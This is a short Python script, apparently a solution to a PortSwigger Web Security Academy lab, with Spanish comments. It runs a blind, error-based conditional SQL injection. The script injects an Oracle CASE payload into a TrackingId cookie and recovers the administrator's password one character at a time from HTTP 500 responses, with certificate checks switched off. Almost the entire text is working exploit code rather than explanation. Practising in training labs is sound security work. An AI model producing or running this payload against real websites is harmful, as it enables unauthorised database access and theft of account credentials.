import requests
import string
import urllib.parse
import urllib3

#PAYLOAD SQLI A BASE DE ERRORES CONDICIONALES (EN ESTE CASO UN CODIGO 500)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = 'https://0ab000940399e2f08014309e009100ea.web-security-academy.net/' #URL
payload = "'|| (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END from users where username ='administrator' and substr(password,{},1)='{}') ||'"
characters = string.printable

password = ''

#rango de la contraseña JAJA
for i in range(1, 21):
    for char in characters:
        cookie = {'TrackingId': 'p9LLdSP8DM1ciArP' + payload.format(i, char)}
        r = requests.get(url, cookies=cookie, verify=False)
        if r.status_code == 500:
            password += char
            break

print("[x] La contraseña es: {}".format(password))